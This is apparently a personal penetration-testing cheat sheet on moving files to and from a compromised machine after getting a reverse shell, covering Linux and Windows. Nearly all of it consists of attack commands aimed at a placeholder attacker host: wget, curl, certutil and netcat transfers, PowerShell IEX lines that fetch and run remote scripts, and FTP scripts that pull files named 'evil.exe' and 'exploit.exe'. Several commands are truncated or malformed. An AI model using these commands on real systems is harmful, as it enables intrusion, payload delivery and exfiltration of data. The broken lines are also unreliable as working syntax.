---
tags: 🔻 🔻/File_Transfer
aliases: Hacking Notes
---

\# In Kali  
python -m SimpleHTTPServer 80  
  
\# In reverse shell - Linux  
wget x.x.x.x  
  
\# In reverse shell - Windows  
powershell -c "(new-object System.Net.WebClient). DownloadFile (*httpipaddressandport*)


# Linux

python -m SimpleHTTPServer 9999  
  
  
#wget  
wget x.x.x.x  
  
#curl  
curl -O ip/file.txt
  
#ncat  
#attacking machine  
nc -lvp 4444 < file  
  
#target machine  
nc x.x.x.x  
  
  
#php  
echo `<?php file\_put\_contents('nameOfFile', fopen('http://x.x.x.x`  
  
  
#tftp  
 tftp x.x.x.x  
tftp> get myfile.txt  
tftp 191.168.0.x.x.x.x  
  
  
#scp  
 Copy a file:  
scp /path/to/source/file.ext username@x.x.x.x  
  
 Copy a directory:  
scp -r /path/to/source/dir username@x.x.x.x  
  
  
#python  
Python SimpleHTTPServer  
  
on Attacker  
python -m SimpleHTTPServer  
  
on target  
wget *attackerip*:8000/filename  
  
  
\------------------------------  
  
Apache  
  
#on Attacker  
cp filetosend.txt /var/www/html  
service apache2 start  
  
#on target  
wget *httpattackersip/file*
curl *httpattackersip/file* \> file  
fetch *httpattackersip/file* \# on BSD  
  
\----------------------------------  
  
#netcat (From Target to Kali)  
  
\# Listen on Kali  
nc -lvp 4444 > file  
  
\# Send from Target machine  
nc <kali\_ip> 4444 < file  
  
\-----------------  
  
  
#netcat (From Kali to Target)  
  
\# on target, wait for the file  
nc -nvlp 55555 > file  
  
\# on kali, push the file  
nc $victimip 55555 < file  
  
  
\----------------------  
  
Extra:  
To send the executable file to your machine:  
  
base64 executable  
\# copy the output  
\# paste it in a file called file.txt  
\# decode it and create the executable  
base64 -d file.txt > executable



# windows

[https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)  
[https://blog.netspi.com/15-ways-to-download-a-file/](https://blog.netspi.com/15-ways-to-download-a-file/)  
  
certutil -urlcache -f *httpattackerip* 
  
  
#Powershell  
echo $storageDir = $pwd > wget.ps1  
echo $webclient = New-Object System.Net.WebClient >>wget.ps1  
echo $url = http*attackerip*
echo $file = "output-file.exe" >>wget.ps1  
echo $webclient.DownloadFile($url,$file) >>wget.ps1  
  
  
  
#powershell  
powershell -c "(new-object System.Net.WebClient).DownloadFile(*attackerip*)x.x.x.x  
powershell -c "Invoke-WebRequest -Uri [http://](http://10.10.14.23/bfill.exe)x.x.x.x  
powershell "IEX(New Object Net.WebClient).downloadString('http:*targetip*/file.ps1')"  
  
  
  
#FTP  
echo open 21> ftp.txt  
echo USER asshat>> ftp.txt  
echo mysecretpassword>> ftp.txt  
echo bin>> ftp.txt  
echo GET wget.exe>> ftp.txt  
echo bye>> ftp.txt  
  
ftp -v -n -s:ftp.txt  
  
#debug  
wine exe2bat.exe nc.exe nc.txt  
  
  
  
  
\--------------------------------------  
TFTP  
\# Windows XP and Win 2003 contain tftp client. Windows 7 do not by default  
\# tfpt clients are usually non-interactive, so they could work through an obtained shell  
  
atftpd --daemon --port 69 /tftp  
Windows> tftp -i x.x.x.x  
  
\--------------------------------------  
  
#FTP P (pyftpdlib client on Kali)  
\# Ftp is generally installed on Windows machines  
\# To make it interactive, use -s option  
  
\# On Kali install a ftp client and set a username/password  
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21  
  
\# on Windows  
ftp *attackerip*
\> binary  
\> get exploit.exe  
  
\-------------------------------------------  
  
#FTP (pureftpd client on Kali)  
  
\# on Kali  
  
\# install ftp client  
apt-get install pure-ftpd  
  
\# create a group  
groupadd ftpgroup  
  
\# add a user  
useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
  
\# Create a directory for your ftp-files (you can also specify a specific user e.g.: /root/ftphome/bob).  
mkdir /root/ftphome  
  
\# Create a ftp-user, in our example "bob" (again you can set "-d /root/ftphome/bob/" if you wish).  
pure-pw useradd bob -u ftpuser -g ftpgroup -d /root/ftphome/  
  
\# Update the ftp database after adding our new user.  
pure-pw mkdb  
  
\# change ownership of the specified ftp directory (and all it's sub-direcotries)  
chown -R ftpuser:ftpgroup /root/ftphome  
  
\# restart Pure-FTPD  
/etc/init.d/pure-ftpd restart  
  
  
\# On Windows  
echo open *attackerip* 21> ftp.txt  
echo USER username password >> ftp.txt  
echo bin >> ftp.txt  
echo GET evil.exe >> ftp.txt  
echo bye >> ftp.txt  
ftp -s:ftp.txt  
  
\--------------------------------------  
  
#Powershell  
echo $storageDir = $pwd > wget.ps1  
echo $webclient = New-Object System.Net.WebClient >>wget.ps1  
echo $url = "[http:*attackerip*/powerup.ps1"] \>>wget.ps1  
echo $file = "powerup.ps1" >>wget.ps1  
echo $webclient.DownloadFile($url,$file) >>wget.ps1  
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1  
  
\--------------------------------------  
\# Powershell download a file  
#Powershell  "IEX(New Object Net.WebClient).downloadString('[http://<targetip>/file.ps1')"](http://%3Ctargetip%3E/file.ps1'))
	
	